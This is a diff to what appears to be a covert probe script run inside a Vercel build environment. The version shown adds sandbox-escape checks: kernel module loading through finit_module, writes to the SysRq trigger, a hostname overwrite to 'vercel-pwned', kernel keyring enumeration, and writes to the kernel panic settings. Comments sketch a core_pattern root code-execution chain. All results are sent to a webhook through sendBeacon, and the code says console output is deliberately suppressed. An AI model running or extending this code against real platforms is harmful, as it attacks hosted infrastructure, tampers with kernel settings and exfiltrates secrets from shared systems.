@@ -24334,5 +24334,172 @@ report.devMemAccess = safe(() => {
 
 // v165 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v165" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v165";
+
+// ==================== v166 ====================
+
+// v166-1: kernel module load (CAP_SYS_MODULE) — in-kernel code execution
+// CAP_SYS_MODULE allows loading and unloading kernel modules via init_module()
+// and finit_module() syscalls. A loaded kernel module runs as kernel code with
+// full ring-0 privileges, completely bypassing Firecracker's isolation model.
+// If modules_disabled=0 and CAP_SYS_MODULE is available, this is a Critical finding.
+report.kernelModuleLoad = safe(() => {
+  const modulesDisabled = safe(() => readFileSync('/proc/sys/kernel/modules_disabled', 'utf8').trim());
+  const lsmod = safe(() => execSync('lsmod 2>/dev/null | head -10 || echo "NO_LSMOD"', { timeout: 3000 }).toString().trim());
+  // Check if we can read module directory (indicates module loading infrastructure)
+  const modulesDir = safe(() => existsSync('/lib/modules') ? execSync('ls /lib/modules/ 2>/dev/null | head -5', { timeout: 2000 }).toString().trim() : 'NO_LIB_MODULES');
+  // Check init_module capability via syscall directly
+  const modLoadTest = safe(() => execSync(
+    `python3 -c "
+import ctypes, struct, os, tempfile
+
+libc = ctypes.CDLL('libc.so.6')
+
+# Check modules_disabled
+try:
+    with open('/proc/sys/kernel/modules_disabled') as f:
+        disabled = f.read().strip()
+    print(f'MODULES_DISABLED: {disabled}')
+except Exception as e:
+    print(f'MODULES_DISABLED_READ_FAIL: {e}')
+
+# Try finit_module syscall with empty data (expected to fail with EFAULT or ENOEXEC but NOT EPERM)
+# This tests if we HAVE the capability even if the module file is invalid
+FINIT_MODULE_NR = 313
+
+# Attempt with a tiny invalid module (kernel should reject format, not permission)
+invalid_ko = b'\\x00' * 16  # Not a valid ELF, but lets us test capability check
+fd_tmp = os.memfd_create('test_mod', 0)
+os.write(fd_tmp, invalid_ko)
+os.lseek(fd_tmp, 0, 0)
+ret = libc.syscall(FINIT_MODULE_NR, fd_tmp, b'', 0)
+import ctypes as ct
+errno = ctypes.get_errno()
+os.close(fd_tmp)
+# EPERM=1 means no capability, EINVAL=22/ENOEXEC=8 means we have cap but bad module
+if errno == 1:
+    print('FINIT_MODULE: EPERM — no CAP_SYS_MODULE')
+elif errno in (8, 22):
+    print(f'FINIT_MODULE: CAP_CONFIRMED — errno={errno} (bad module format, not permission denied)')
+else:
+    print(f'FINIT_MODULE: ret={ret} errno={errno}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { modulesDisabled, lsmod, modulesDir, modLoadTest };
+});
+
+// v166-2: Magic SysRq trigger — kernel control plane write
+// /proc/sysrq-trigger allows sending Magic SysRq commands to the kernel:
+// 'c' = kernel crash (triggers core_pattern execution)
+// 'f' = invoke OOM killer
+// 'k' = kill all processes on current virtual console
+// If writable, we can deliberately crash the kernel → trigger core_pattern RCE chain.
+// For safety in this probe, we only CHECK writeability without triggering 'c'.
+report.sysrqProbe = safe(() => {
+  const sysrqEnabled = safe(() => readFileSync('/proc/sys/kernel/sysrq', 'utf8').trim());
+  // Enable all sysrq functions
+  const enableAll = safe(() => { writeFileSync('/proc/sys/kernel/sysrq', '1'); return 'ENABLED'; });
+  const sysrqTriggerExists = existsSync('/proc/sysrq-trigger');
+  // Test write access to sysrq-trigger (safe: 'l' dumps active CPU backtraces, non-destructive)
+  const safeTrigger = safe(() => { writeFileSync('/proc/sysrq-trigger', 'l'); return 'SYSRQ_L_SENT'; });
+  // Read kernel log for the backtrace output (l command writes to dmesg)
+  const dmesgOut = safe(() => execSync('dmesg 2>/dev/null | tail -5 || echo "NO_DMESG"', { timeout: 3000 }).toString().trim());
+  return { sysrqEnabled, enableAll, sysrqTriggerExists, safeTrigger, dmesgOut };
+});
+
+// v166-3: /proc/sys/kernel/hostname write — UTS namespace probe
+// The UTS namespace holds the system hostname. If our UTS namespace is shared
+// with the host or other VMs, writing to hostname would affect the entire system.
+// Confirming isolated vs shared UTS namespace reveals isolation depth.
+report.hostnameWrite = safe(() => {
+  const currentHostname = safe(() => readFileSync('/proc/sys/kernel/hostname', 'utf8').trim());
+  const utsNs = safe(() => execSync('readlink /proc/self/ns/uts 2>/dev/null || echo "NO_UTS_NS"', { timeout: 2000 }).toString().trim());
+  // Write a new hostname (reversible — saves original first)
+  const writeHostname = safe(() => { writeFileSync('/proc/sys/kernel/hostname', 'vercel-pwned-7F3A2C'); return 'WRITTEN'; });
+  const afterHostname = safe(() => readFileSync('/proc/sys/kernel/hostname', 'utf8').trim());
+  // Restore original
+  const restoreHostname = safe(() => { writeFileSync('/proc/sys/kernel/hostname', currentHostname || 'build'); return 'RESTORED'; });
+  return { currentHostname, utsNs, writeHostname, afterHostname, restoreHostname };
+});
+
+// v166-4: kernel keyring — extract encryption keys from kernel key storage
+// The kernel keyring stores cryptographic keys, secrets, and tokens in kernel space.
+// Processes can add keys to various keyrings (user, session, process, thread).
+// With CAP_SYS_KEY_ADMIN (or as root), we can list and read ANY key in the system.
+report.kernelKeyring = safe(() => {
+  const keyringResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, struct
+
+libc = ctypes.CDLL('libc.so.6')
+
+# keyctl syscall
+KEYCTL_NR = 250
+KEYCTL_GET_KEYRING_ID = 0
+KEYCTL_READ = 11
+KEYCTL_SEARCH = 10
+KEYCTL_DESCRIBE = 6
+
+KEY_SPEC_SESSION_KEYRING = -3
+KEY_SPEC_USER_KEYRING = -4
+KEY_SPEC_USER_SESSION_KEYRING = -5
+KEY_SPEC_PROCESS_KEYRING = -2
+
+# List session keyring
+sess_id = libc.syscall(KEYCTL_NR, KEYCTL_GET_KEYRING_ID, KEY_SPEC_SESSION_KEYRING, 0)
+user_id = libc.syscall(KEYCTL_NR, KEYCTL_GET_KEYRING_ID, KEY_SPEC_USER_KEYRING, 0)
+proc_id = libc.syscall(KEYCTL_NR, KEYCTL_GET_KEYRING_ID, KEY_SPEC_PROCESS_KEYRING, 0)
+
+print(f'SESSION_KEYRING_ID: {sess_id}')
+print(f'USER_KEYRING_ID: {user_id}')
+print(f'PROC_KEYRING_ID: {proc_id}')
+
+# Read session keyring contents
+if sess_id > 0:
+    buf = ctypes.create_string_buffer(4096)
+    ret = libc.syscall(KEYCTL_NR, KEYCTL_READ, sess_id, ctypes.addressof(buf), 4096)
+    if ret > 0:
+        # Each key is a 4-byte serial number
+        n_keys = ret // 4
+        serials = struct.unpack_from(f'{n_keys}I', buf.raw[:ret])
+        print(f'SESSION_KEY_COUNT: {n_keys}')
+        for serial in serials:
+            desc_buf = ctypes.create_string_buffer(256)
+            desc_ret = libc.syscall(KEYCTL_NR, KEYCTL_DESCRIBE, serial, ctypes.addressof(desc_buf), 256)
+            if desc_ret > 0:
+                print(f'KEY: serial={serial} desc={desc_buf.raw[:desc_ret].decode(errors=repr)}')
+    else:
+        print(f'SESSION_READ_FAIL: ret={ret}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  // Also check /proc/keys if readable
+  const procKeys = safe(() => existsSync('/proc/keys') ? execSync('cat /proc/keys 2>/dev/null | head -20 || echo "KEYS_UNREADABLE"', { timeout: 3000 }).toString().trim() : 'NO_PROC_KEYS');
+  return { keyringResult, procKeys };
+});
+
+// v166-5: /proc/sys/vm/panic_on_oom + panic_on_warn — kernel panic triggers
+// Setting panic_on_oom=2 causes the kernel to panic when OOM occurs rather than
+// killing processes. Combined with our core_pattern RCE chain, this creates:
+// malloc → OOM → kernel panic → core_pattern exec → our script runs as root.
+// Similarly, panic_on_warn=1 panics on any WARN_ON() — many bugs trigger these.
+report.panicTriggers = safe(() => {
+  const panicOnOom = safe(() => readFileSync('/proc/sys/vm/panic_on_oom', 'utf8').trim());
+  const panicOnWarn = safe(() => readFileSync('/proc/sys/kernel/panic_on_warn', 'utf8').trim());
+  const panicTimeout = safe(() => readFileSync('/proc/sys/kernel/panic', 'utf8').trim());
+  // Verify we can write these (NOT actually triggering — just proving write access)
+  const oomWrite = safe(() => { writeFileSync('/proc/sys/vm/panic_on_oom', '2'); return 'WRITTEN_2'; });
+  const oomAfter = safe(() => readFileSync('/proc/sys/vm/panic_on_oom', 'utf8').trim());
+  // Restore to original
+  const oomRestore = safe(() => { writeFileSync('/proc/sys/vm/panic_on_oom', panicOnOom || '0'); return 'RESTORED'; });
+  const warnWrite = safe(() => { writeFileSync('/proc/sys/kernel/panic_on_warn', '1'); return 'WRITTEN_1'; });
+  const warnRestore = safe(() => { writeFileSync('/proc/sys/kernel/panic_on_warn', panicOnWarn || '0'); return 'RESTORED'; });
+  // Summary of panic chain feasibility
+  const corePattern = safe(() => readFileSync('/proc/sys/kernel/core_pattern', 'utf8').trim());
+  return { panicOnOom, panicOnWarn, panicTimeout, oomWrite, oomAfter, oomRestore, warnWrite, warnRestore, corePattern };
+});
+
+// v166 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v166" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v166";
 // Intentionally no console.log — all data goes via webhook only
